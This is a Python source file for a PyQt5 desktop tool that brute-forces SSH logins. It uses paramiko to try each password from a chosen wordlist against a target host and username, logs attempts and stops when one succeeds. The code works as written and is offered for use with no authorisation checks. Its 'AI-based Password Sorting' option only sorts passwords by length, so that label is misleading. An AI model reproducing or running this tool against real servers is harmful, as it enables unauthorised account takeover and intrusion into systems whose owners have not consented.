
import sys
import paramiko
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QLabel,
    QLineEdit, QTextEdit, QFileDialog, QComboBox, QCheckBox, QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal

class SSHBruteWorker(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, host, port, username, wordlist_path, use_ai=False):
        super().__init__()
        self.host = host
        self.port = port
        self.username = username
        self.wordlist_path = wordlist_path
        self.use_ai = use_ai
        self.running = True

    def run(self):
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.readlines()

            if self.use_ai:
                passwords = sorted(passwords, key=lambda x: len(x))  # örnek sıralama

            for pwd in passwords:
                if not self.running:
                    break
                password = pwd.strip()
                self.log_signal.emit(f"Trying: {password}")
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(self.host, port=int(self.port), username=self.username, password=password, timeout=5)
                    self.log_signal.emit(f"✅ Success: {password}")
                    ssh.close()
                    break
                except Exception as e:
                    self.log_signal.emit(f"❌ Failed: {password}")
        except Exception as e:
            self.log_signal.emit(f"Error: {str(e)}")

    def stop(self):
        self.running = False

class BruteForceGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Brute-Force Tool GUI - SSH Example")
        self.setGeometry(200, 200, 600, 400)
        layout = QVBoxLayout()

        self.host_input = QLineEdit()
        self.host_input.setPlaceholderText("Target Host (e.g., 192.168.1.1)")
        layout.addWidget(self.host_input)

        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Port (default 22)")
        layout.addWidget(self.port_input)

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Username")
        layout.addWidget(self.username_input)

        self.wordlist_btn = QPushButton("Select Wordlist")
        self.wordlist_btn.clicked.connect(self.load_wordlist)
        layout.addWidget(self.wordlist_btn)

        self.wordlist_path = ""

        self.ai_checkbox = QCheckBox("Use AI-based Password Sorting")
        layout.addWidget(self.ai_checkbox)

        self.start_btn = QPushButton("Start Brute Force")
        self.start_btn.clicked.connect(self.start_attack)
        layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_attack)
        layout.addWidget(self.stop_btn)

        self.output_log = QTextEdit()
        self.output_log.setReadOnly(True)
        layout.addWidget(self.output_log)

        self.setLayout(layout)
        self.worker = None

    def load_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt)")
        if file_path:
            self.wordlist_path = file_path
            self.output_log.append(f"Loaded wordlist: {file_path}")

    def start_attack(self):
        host = self.host_input.text()
        port = self.port_input.text() or "22"
        username = self.username_input.text()
        use_ai = self.ai_checkbox.isChecked()

        if not all([host, port, username, self.wordlist_path]):
            QMessageBox.warning(self, "Input Error", "Please fill all fields and select a wordlist.")
            return

        self.worker = SSHBruteWorker(host, port, username, self.wordlist_path, use_ai)
        self.worker.log_signal.connect(self.update_log)
        self.worker.start()

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.output_log.append("🛑 Attack stopped by user.")

    def update_log(self, message):
        self.output_log.append(message)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = BruteForceGUI()
    window.show()
    sys.exit(app.exec_())
